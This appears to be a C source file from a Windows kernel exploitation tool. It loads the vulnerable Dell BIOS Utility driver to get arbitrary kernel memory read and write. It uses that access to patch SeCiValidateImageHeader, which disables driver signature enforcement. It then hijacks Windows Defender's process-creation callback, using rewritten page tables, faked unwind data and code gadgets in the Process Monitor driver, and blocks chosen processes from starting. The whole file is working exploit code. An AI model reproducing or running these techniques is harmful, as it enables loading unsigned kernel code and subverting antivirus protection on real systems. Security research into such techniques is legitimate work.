#include "malk.h"
#include "kinfo.h"
#include "pager.h"
#include "dbutil.h"
#include "procmon.h"
#include "kfuncs.h"
#include "scmDriver.h"
#include <fltuser.h>
#include <stdio.h>
#include "macro.h"

BOOL setDigitalSignatureEnforcementCallback(ULONG64 addr)
{
	// modify callbacks to return >= 0
	// this method make unsigned driver is loaded as signed driver
	//   does not work when HVCI is enabled because signature is checked in Secure Kernel too
	if (!initKernelInfo()) {
		printf("Cannot get kernel info\n");
		return FALSE;
	}

	HANDLE hDevice = dbutil_loadDevice();
	if (hDevice == NULL) {
		printf("Cannot load Dell BIOS Util driver\n");
		return FALSE;
	}
	atexit(dbutil_unloadDevice);

	ULONG64 targetVa = getSeCiValidateImageHeaderVa();
	ULONG64 val = 0;
	if (!dbutil_read(hDevice, targetVa, &val, sizeof(val))) {
		printf("Cannot read SeCiValidateImageHeader value at: 0x%llx\n", targetVa);
		return FALSE;
	}
	printf("Currrent SeCiValidateImageHeader value: 0x%llx\n", val);
	// addr 0 for disable DSE
	if (addr == 0)
		addr = findKernelExportVa("rand");

	printf("Setting SeCiValidateImageHeader value to: 0x%llx\n", addr);

	if (val != addr) {
		if (!dbutil_write(hDevice, targetVa, &addr, sizeof(addr))) {
			printf("Cannot replace SeCiValidateImageHeader value\n");
			return FALSE;
		}
	}

	printf("Setting SeCiValidateImageHeader value done\n");

	return TRUE;
}

struct WppCodeInfo {
	ULONG64 pte;
	DWORD functionOffset; // offset from start of page
	DWORD raxPfnTraceMessage; // RVA from start of code page
	DWORD r8TraceguidsRva; // RVA from start of code page
	DWORD callMemRva; // RVA from start of code page
};
BOOL findWppCode(WppCodeInfo* wppInfo)
{
	// find WPP_SF_ function in windows driver
	// r8 is set to address of guid
	// r9 is size of guid (0x10)
	// rdx is set to 0x2b
	// rcx is preserved
	/*
	sub     rsp, 38h
	mov     rax, cs:pfnWppTraceMessage
	lea     r8, WPP_717819f6836a376d5388251f8764e444_Traceguids
	and     [rsp+38h+var_18], 0
	mov     edx, 10h
	movzx   r9d, dx
	mov     edx, 2Bh ; '+'
	call    cs:__guard_dispatch_icall_fptr
	add     rsp, 38h
	retn
	*/
	LONG64 hvsocketcontrolVa = findDriverVa("umpass.sys");
	if (hvsocketcontrolVa == 0) {
		printf("Cannot find umpass driver address\n");
		return FALSE;
	}

	// the WPP_SF_ is likely to be first function in .text section
	wppInfo->pte = getPteValue(hvsocketcontrolVa + 0x1000);
	BYTE* code = getMappedMemory(wppInfo->pte);
	int offset;
	for (offset = 0; offset < 0x800; offset += 4) {
		// 48 83 ec 38: sub rsp, 38h
		if (*(DWORD*)(code + offset) == 0x38ec8348) {
			break;
		}
	}
	if (offset == 0x800) {
		printf("Invalid WPP_SF_ at 0x%x\n", offset);
		return FALSE;
	}
	// expected offset is 8
	wppInfo->functionOffset = offset;
	// skip "sub rsp, 38h" instruction
	offset += 4;

	// mov rax, [rip + offset_to_pfnWppTraceMessage]
	// Note: this poninter to function is not used becuase we will replace call [rip+offset_to_guard_dispatch_icall_fptr]
	//   but we need it to be accessible preventing page fault
	if (!(code[offset] == 0x48 && code[offset + 1] == 0x8b && code[offset + 2] == 0x05)) {
		printf("Expected mov rax,[rip+pfnWppTraceMessage] at 0x%x\n", offset);
		return FALSE;
	}
	DWORD rax_pfn_imm = 0;
	memcpy(&rax_pfn_imm, &code[offset + 3], sizeof(DWORD));
	offset += 7; // size of current instruction
	wppInfo->raxPfnTraceMessage = rax_pfn_imm + offset;


	// lea r8, WPP_xxx_Traceguids
	if (!(code[offset] == 0x4c && code[offset + 1] == 0x8d && code[offset + 2] == 0x05)) {
		printf("Expected lea r8,[rip+Traceguids] at 0x%x\n", offset);
		return FALSE;
	}
	DWORD r8_traceguids_imm = 0;
	memcpy(&r8_traceguids_imm, &code[offset + 3], sizeof(DWORD));
	offset += 7; // size of current instruction
	wppInfo->r8TraceguidsRva = r8_traceguids_imm + offset;

	// skip setting edx (0x2b), r9d (0x10), 5th args (0)
	offset += 0xf;

	// call [rip+__guard_dispatch_icall_fptr]
	if (!(code[offset] == 0xff && code[offset + 1] == 0x15)) {
		printf("Expected call [rip+__guard_dispatch_icall_fptr] at 0x%x\n", offset);
		return FALSE;
	}
	DWORD call_guard_imm = 0;
	memcpy(&call_guard_imm, &code[offset + 2], sizeof(DWORD));
	offset += 6; // size of current instruction
	wppInfo->callMemRva = call_guard_imm + offset;

	return TRUE;
}

typedef struct CreateProcessNotifyInfo {
	HANDLE hPort;
	HANDLE hProcessNotifyThread;
	ULONG64* targetCallbackPtr;
	ULONG64 oldTargetCallbackValue;
	ULONG64 keventVa;
	SavePageEntry savedUnwindDataPte;
} CreateProcessNotifyInfo;
CreateProcessNotifyInfo createProcessNotifyInfo;

typedef struct _PS_CREATE_NOTIFY_INFO {
	SIZE_T              Size;
	union {
		ULONG Flags;
		struct {
			ULONG FileOpenNameAvailable : 1;
			ULONG IsSubsystemProcess : 1;
			ULONG Reserved : 30;
		};
	};
	HANDLE              ParentProcessId;
	CLIENT_ID           CreatingThreadId;
	VOID* /*struct _FILE_OBJECT**/ FileObject;
	PUNICODE_STRING    ImageFileName;
	PUNICODE_STRING    CommandLine;
	NTSTATUS            CreationStatus;
} PS_CREATE_NOTIFY_INFO, * PPS_CREATE_NOTIFY_INFO;
static BOOL isProcessExe(PCWSTR szImageFileName, DWORD len, PCWSTR chkFileName)
{
	DWORD chkLen = (DWORD)wcslen(chkFileName);
	if (chkLen > len) {
		return FALSE;
	}

	PCWSTR ptr = &szImageFileName[len - chkLen];
	// if szImageFileName is full path, before filename MUST be '\\'
	if (len > chkLen && ptr[-1] != L'\\') {
		return FALSE;
	}

	PCWSTR eptr = szImageFileName + len;
	for (; ptr < eptr; ptr++, chkFileName++) {
		if (towlower(*ptr) != towlower(*chkFileName)) {
			return FALSE;
		}
	}

	return TRUE;
}

DWORD createProcessNotifyWorker(void* workerCtx)
{
	HANDLE hPort = (HANDLE)workerCtx;

	KeClearEvent(createProcessNotifyInfo.keventVa);

	typedef struct MessageBuffer {
		FILTER_MESSAGE_HEADER hdr;
		PVOID data[6];
	} MessageBuffer;

	MessageBuffer msgBuffer;

	while (1) {
		HRESULT hr = FilterGetMessage(hPort, (PFILTER_MESSAGE_HEADER)&msgBuffer, sizeof(msgBuffer), NULL);
		if (hr != S_OK) {
			break;
		}
		if (msgBuffer.hdr.ReplyLength != 0) {
			printf("[!] message reply length is not zero (%d)\n", msgBuffer.hdr.ReplyLength);
			FILTER_REPLY_HEADER reply = { 0, msgBuffer.hdr.MessageId };
			FilterReplyMessage(hPort, &reply, sizeof(reply));
		}
		//printf("Got Filter message\n");
		//printf("  ContextRecord addr: 0x%llx\n", (ULONG64)msgBuffer.data[1]);
		//printf("  ExceptionRecord addr: 0x%llx\n", (ULONG64)msgBuffer.data[0]);
		//PEXCEPTION_RECORD64 pExceptionRecord = (PEXCEPTION_RECORD64)msgBuffer.data[0]; // EXCEPTION_RECORD
		PCONTEXT pContextRecord = (PCONTEXT)walkPage((ULONG64)msgBuffer.data[1]);
		//pContextRecord->Rcx; // PEPROCESS
		//pContextRecord->Rdx; // ProcessId
		if (pContextRecord->R8 == 0) {
			printf("  pid: %llu is exiting\n", pContextRecord->Rdx);
		}
		else {
			// read/modify create process as needed
			PPS_CREATE_NOTIFY_INFO pCreateInfo = (PPS_CREATE_NOTIFY_INFO)walkPage(pContextRecord->R8);
			// Note: ImageFileName needs walkPage again. the address is in kernel mode
			if (pCreateInfo->ImageFileName != NULL) {
				PUNICODE_STRING imageFileName = (PUNICODE_STRING)walkPage((ULONG64)pCreateInfo->ImageFileName);
				PWSTR szFileName = imageFileName ? (PWSTR)walkPage((ULONG64)imageFileName->Buffer) : NULL;
				if (szFileName == NULL) {
					// cannot read szFileName
					printf("new process pid: %lld\n", pContextRecord->Rdx);
				}
				else {
					DWORD szLen = imageFileName->Length / 2;
					wprintf(L"new process pid: %lld, %.*s\n", pContextRecord->Rdx, szLen, szFileName);
					if (isProcessExe(szFileName, szLen, L"msedge.exe") || isProcessExe(szFileName, szLen, L"notepad.exe")) {
						pCreateInfo->CreationStatus = STATUS_ACCESS_DENIED;
					}
				}
			}
			else {
				wprintf(L"new process pid: %lld, parent: %lld\n", pContextRecord->Rdx, (ULONG64)pCreateInfo->ParentProcessId);
			}
		}

		// trigger event in kernel to signal a waiting thread
		KeSetEvent(createProcessNotifyInfo.keventVa, 0, FALSE);
	}

	return 0;
}

BOOL startCreateProcessNotify(WppCodeInfo* wppInfo)
{
	ULONG64 procmonVa = findDriverVa(PROCMON_SYS);
	if (procmonVa == 0) {
		printf("Cannot find procmon driver address\n");
		return FALSE;
	}

#define PROCMON_IMAGE_SIZE 0x18000
#define PROCMON_SEND_MESSAGE_RVA 0x3850
#define PROCMON_FN_WAIT_RVA 0x8b40
#define PROCMON_EVT_OBJECT_RVA 0x107a0 // must be SynchronizationEvent (or use FAST_MUTEX+0x18)
#define PROCMON_WAIT_OBJECT_RVA 0xf6a0 // target object that wait function used (it might be KTIMER, KMUTANT)
#define	PROCMON_KERELEASEMUTEX_IAT_RVA 0xc2f0
#define PROCMON_RET_OFFSET 0x2872
#define PROCMON_RET_ZERO_RVA 0x2870
#define PROCMON_RET_POSITIVE_RVA 0x8828 // mov eax, 4; ret

// Note: handler works only when exception is read fault only
#define PROCMON_ACCESS_VIOLATION_OFFSET 0x32c7 // in fnRva 0x3060: mov  rdx, [rdx+10h]  # rdx is ProcessId (always invalid address)
#define PROCMON_UNWIND_INFO_OFFSET 0xd888
// UNW_FLAG_EHANDLER, ver1, rva of _c_specific_handler
#define FAKE_UNWIND_INFO "\x09\x00\x00\x00\x65\xa9\x00\x00"
#define CSCOPE_BEGIN_RVA 0x3070
#define CSCOPE_END_RVA 0x34e0
#define CSCOPE_HANDLER_RVA 0x32fa // ret of its function

	// wpp function at the end of Process Monitor driver
	ULONG64 wppBasePage = procmonVa + PROCMON_IMAGE_SIZE;
	ULONG64* wppBasePtePtr = getPtePointer(wppBasePage);
	wppBasePtePtr[0] = wppInfo->pte;
	ULONG64 wppFunctionVa = wppBasePage + wppInfo->functionOffset;
	// function to pointer must be accessible
	NonPagedInfo npWppInfo1 = { 0 };
	SavePageEntry savedWppPte1 = { 0 };
	NonPagedInfo npWppInfoIat = { 0 };
	SavePageEntry savedWppPteIat = { 0 };
	if (!newDataPte(wppBasePage + wppInfo->raxPfnTraceMessage, &npWppInfo1, &savedWppPte1)) {
		printf("!!! Cannot new data pte for wpp code\n");
		return FALSE;
	}
	// set function call target
	if (!newDataPte(wppBasePage + wppInfo->callMemRva, &npWppInfoIat, &savedWppPteIat)) {
		printf("!!! Cannot new data pte for call [mem]\n");
		return FALSE;
	}
	*(ULONG64*)(npWppInfoIat.buffer + PAGE_OFFSET(wppInfo->callMemRva)) = procmonVa + PROCMON_SEND_MESSAGE_RVA;

	ULONG64 targetUnwindInfoVa = procmonVa + PROCMON_UNWIND_INFO_OFFSET;
	NonPagedInfo npUnwindDataInfo = { 0 };
	if (!newDataPte(targetUnwindInfoVa, &npUnwindDataInfo, &createProcessNotifyInfo.savedUnwindDataPte)) {
		printf("!!! Cannot new data pte for unwind data\n");
		return FALSE;
	}

	// copy KEVENT to KTIMER for calling wait for event
	ULONG64* pEvtObj = (ULONG64*)walkPage(procmonVa + PROCMON_EVT_OBJECT_RVA);
	ULONG64* pTargetObj = (ULONG64*)walkPage(procmonVa + PROCMON_WAIT_OBJECT_RVA);
	// KEVENT size is 0x18 but copy only first field, LIST_ENTRY must be fixed to new address
	*pTargetObj = *pEvtObj;
	pTargetObj[1] = procmonVa + PROCMON_WAIT_OBJECT_RVA + 8; // fix LIST_ENTRY
	pTargetObj[2] = pTargetObj[1];
	createProcessNotifyInfo.keventVa = procmonVa + PROCMON_WAIT_OBJECT_RVA;
	// used wait fuction will call KeReleaseMutex, modify its import address to "return 0" function
	ULONG64* releaseMutexIat = (ULONG64*)walkPage(procmonVa + PROCMON_KERELEASEMUTEX_IAT_RVA);
	*releaseMutexIat = procmonVa + PROCMON_RET_ZERO_RVA; // make it be empty function because the mutex is modified

#pragma pack(push, 4)
	typedef struct _C_SCOPE_TABLE_ENTRY {
		DWORD Begin;
		DWORD EndRva;
		DWORD FilterRva;
		DWORD TargetRva;
	} C_SCOPE_TABLE_ENTRY;
	typedef struct _C_SCOPE_TABLE {
		DWORD NumEntries;
		C_SCOPE_TABLE_ENTRY Table[1];
	} C_SCOPE_TABLE;
#pragma pack(pop)
	BYTE* unwindData = npUnwindDataInfo.buffer + PAGE_OFFSET(PROCMON_UNWIND_INFO_OFFSET);
	// copy from registerFilter unwind info which is __C_specific_handler
	memcpy(unwindData, FAKE_UNWIND_INFO, sizeof(FAKE_UNWIND_INFO) - 1);
	C_SCOPE_TABLE* cscopeTable = (C_SCOPE_TABLE*)(unwindData + sizeof(FAKE_UNWIND_INFO) - 1);
	cscopeTable->NumEntries = 3;
	cscopeTable->Table[0].Begin = CSCOPE_BEGIN_RVA;
	cscopeTable->Table[0].EndRva = CSCOPE_END_RVA;
	cscopeTable->Table[0].FilterRva = (DWORD)(wppFunctionVa - procmonVa); // FltSendMessage returns 0 which is continue searching in table
	cscopeTable->Table[0].TargetRva = CSCOPE_HANDLER_RVA; // continue addess
	cscopeTable->Table[1].Begin = CSCOPE_BEGIN_RVA;
	cscopeTable->Table[1].EndRva = CSCOPE_END_RVA;
	cscopeTable->Table[1].FilterRva = (DWORD)(PROCMON_FN_WAIT_RVA); // wait for event (done processing notify routine)
	cscopeTable->Table[1].TargetRva = CSCOPE_HANDLER_RVA; // continue addess
	cscopeTable->Table[2].Begin = CSCOPE_BEGIN_RVA;
	cscopeTable->Table[2].EndRva = CSCOPE_END_RVA;
	cscopeTable->Table[2].FilterRva = (DWORD)(PROCMON_RET_POSITIVE_RVA); // execute the target handler
	cscopeTable->Table[2].TargetRva = CSCOPE_HANDLER_RVA; // continue addess


	// procmon has no CFG. so all CFG bitmap is set for all address of procmon
	ULONG64* targetCallbackPtr = NULL;
	ULONG64* pCreateProcessNotifyRoutines = (ULONG64*)walkPage(getPspCreateProcessNotifyRoutineVa());
	// instead of registering new process creation callback, I steal callback from Windows Defender driver.
	// So, the program does not work if the Windows Defender is not running.
	for (int i = 0; i < 0x40; i++) {
		if (pCreateProcessNotifyRoutines[i] == NULL) {
			break;
		}
		ULONG64* callbackPtr = (ULONG64*)walkPage(pCreateProcessNotifyRoutines[i] & 0xfffffffffffffff0);
		DriverMap* pDriver = findDriverFromAddress(callbackPtr[1]);
		if (callbackPtr[1] == procmonVa + PROCMON_RET_OFFSET || _stricmp(pDriver->name, "WdFilter.sys") == 0) {
			targetCallbackPtr = &callbackPtr[1];
			break;
		}
	}
	if (!targetCallbackPtr) {
		printf("Cannot find CreateProcessNotifyRoutine for WdFilter.sys\n");
		return FALSE;
	}

	// lpContext MUST be null to use SendMessage without reply buffer
	DWORD context = 0;
	HRESULT hr = FilterConnectCommunicationPort(L"\\ProcessMonitor24Port", 0, &context, 4, NULL, &createProcessNotifyInfo.hPort);
	if (hr != S_OK) {
		printf("Cannot connect to monitor port, error 0x%x\n", hr);
		return FALSE;
	}
	printf("[+] connected to ProcessMonitor24Port\n");

	createProcessNotifyInfo.hProcessNotifyThread = CreateThread(NULL, 0, createProcessNotifyWorker, createProcessNotifyInfo.hPort, 0, NULL);
	if (createProcessNotifyInfo.hProcessNotifyThread == NULL) {
		printf("Cannot create createProcessNotifyWorker thread, error: %d\n", GetLastError());
		CloseHandle(createProcessNotifyInfo.hPort);
		return FALSE;
	}

	createProcessNotifyInfo.targetCallbackPtr = targetCallbackPtr;
	createProcessNotifyInfo.oldTargetCallbackValue = *targetCallbackPtr;

	printf("[?] enter to start hooking kernel create process callback\n");
	getchar();
	*targetCallbackPtr = procmonVa + PROCMON_ACCESS_VIOLATION_OFFSET;

	return TRUE;
}

void stopCreateProcessNotify()
{
	if (!createProcessNotifyInfo.targetCallbackPtr) {
		return;
	}

	*createProcessNotifyInfo.targetCallbackPtr = createProcessNotifyInfo.oldTargetCallbackValue;
	createProcessNotifyInfo.targetCallbackPtr = NULL;

	// sleep in case of newing process is sent to filter port
	printf("[.] waiting for process worker thread\n");
	Sleep(1000);

	restorePageEntry(&createProcessNotifyInfo.savedUnwindDataPte);

	CloseHandle(createProcessNotifyInfo.hPort);
	createProcessNotifyInfo.hPort = NULL;

	// real wait for worker thread
	WaitForSingleObject(createProcessNotifyInfo.hProcessNotifyThread, INFINITE);
	CloseHandle(createProcessNotifyInfo.hProcessNotifyThread);
	createProcessNotifyInfo.hProcessNotifyThread = NULL;
}


int demoKernelCreateProcessCallback()
{
	// load all needed drivers
	if (!dbutil_startDriver()) {
		printf("cannot start Dell BIOS Utility driver\n");
		return 1;
	}
	atexit(dbutil_unloadDevice);

	if (!procmon_startDriver()) {
		printf("cannot start procmon driver\n");
		return 1;
	}

	if (!scmStartDriver2(L"UmPass")) {
		printf("cannot load umpass driver\n");
		return 1;
	}

	if (!initKernelInfo()) {
		printf("cannot get kernel info\n");
		return 1;
	}

	setPagerVerbose(FALSE);

	if (!pager_init()) {
		return 1;
	}
	if (!patchSddt()) {
		return 1;
	}

	// test kernel function call
	DWORD pid = GetCurrentProcessId();
	printf("[.] test calling kernel functions\n");
	printf("      ETHREAD: 0x%llx, EPROCESS: 0x%llx\n", KeGetCurrentThread(), PsLookupProcessByProcessId(pid));
	
	WppCodeInfo wppInfo;
	if (!findWppCode(&wppInfo)) {
		return 1;
	}

	if (!startCreateProcessNotify(&wppInfo)) {
		return 1;
	}
	atexit(stopCreateProcessNotify);

	printf("[?] enter to exit\n");
	getchar();

	return 0;
}